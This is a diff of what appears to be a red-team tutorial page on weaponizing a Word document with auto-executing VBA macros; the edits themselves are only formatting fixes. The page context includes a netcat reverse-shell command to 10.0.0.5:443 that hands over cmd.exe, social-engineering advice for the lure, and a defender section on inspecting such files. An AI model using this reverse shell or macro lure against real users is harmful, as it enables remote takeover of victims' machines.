@@ -8,7 +8,7 @@ This technique will build a primitive word document that will auto execute the V
 
 ## Weaponization
 
-1. Create new word document \(CTRL+N\)
+1. Create new word document (CTRL+N)
 2. Hit ALT+F11 to go into Macro editor
 3. Double click into the "This document" and CTRL+C/V the below:
 
@@ -21,7 +21,7 @@ End Sub
 ```
 {% endcode %}
 
-{% code title="C:\\tools\\shell.cmd" %}
+{% code title="C:\tools\shell.cmd" %}
 ```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 ```
@@ -33,13 +33,15 @@ This is how it should look roughly in:
 
 ALT+F11 to switch back to the document editing mode and add a flair of social engineering like so:
 
-![](../../../.gitbook/assets/macros-body%20%281%29.png)
+![](../../../.gitbook/assets/macros-body.png)
 
 Save the file as a macro enabled document, for example a Doc3.dotm:
 
 ![](../../../.gitbook/assets/macros-filename.png)
 
-{% file src="../../../.gitbook/assets/doc3.dotm" caption="Dot3.dotm - Word Document with Embedded VBA Macros" %}
+{% file src="../../../.gitbook/assets/doc3.dotm" %}
+Dot3.dotm - Word Document with Embedded VBA Macros
+{% endfile %}
 
 ## Execution
 
@@ -59,9 +61,9 @@ The below graphic represents the process ancestry after the victim had clicked t
 
 ## Inspection
 
-If you received a suspicious Office document and do not have any malware analysis tools, hopefully at least you have access to a WinZip or 7Zip and Strings utility or any type of Hex Editor to hand. 
+If you received a suspicious Office document and do not have any malware analysis tools, hopefully at least you have access to a WinZip or 7Zip and Strings utility or any type of Hex Editor to hand.&#x20;
 
-Since Office files are essentially ZIP archives \(PK magic bytes\):
+Since Office files are essentially ZIP archives (PK magic bytes):
 
 ```bash
 root@remnux:/home/remnux# hexdump -C Doc3.dotm | head -n1
@@ -76,7 +78,7 @@ Looking inside the `document.xml`, we can see the body copy we inputted at the v
 
 ![](../../../.gitbook/assets/macros-document-unzipped.png)
 
-Additionally, if you have the strings or a hex dumping utility, you can pass the `vbaProject.bin` through it. This can sometimes give you as defender enough to determine if the document is suspicious/malicious. 
+Additionally, if you have the strings or a hex dumping utility, you can pass the `vbaProject.bin` through it. This can sometimes give you as defender enough to determine if the document is suspicious/malicious.&#x20;
 
 Running `hexdump -C vbaProject.bin` reveals some fragmented keywords that should immediately raise your suspicion - **Shell, Hide, Sub\_Open** and something that looks like a file path:
 
@@ -93,4 +95,3 @@ Note that the olevba can be fooled as per [http://www.irongeek.com/i.php?page=vi
 ## References
 
 {% embed url="https://attack.mitre.org/wiki/Technique/T1137" %}
-
